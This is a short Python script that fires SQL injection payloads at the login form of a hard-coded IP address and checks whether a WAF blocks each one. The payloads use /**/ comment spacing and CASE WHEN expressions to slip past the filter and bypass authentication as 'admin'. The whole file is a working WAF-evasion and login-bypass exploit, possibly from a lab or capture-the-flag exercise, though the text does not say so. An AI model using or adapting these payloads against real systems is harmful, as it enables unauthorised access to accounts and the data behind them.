import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"},
                       allow_redirects=False)
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:45}] status={r.status_code} loc={r.headers.get('Location')} waf={waf}")

test("admin'/**/CASE/**/WHEN/**/1>0/**/THEN/**/1/**/END/**/#", "case-when-then-end-slashstar")
test("'/**/CASE/**/WHEN/**/1>0/**/THEN/**/1/**/END/**/#", "case-nouser-slashstar")
test("admin'/**/CASE/**/WHEN/**/1>0/**/THEN/**/1/**/ELSE/**/0/**/END#", "case-else-slashstar")
test("'/**/CASE/**/WHEN/**/1>0/**/THEN/**/1/**/END/**/LIMIT/**/1#", "case-limit1-slashstar")
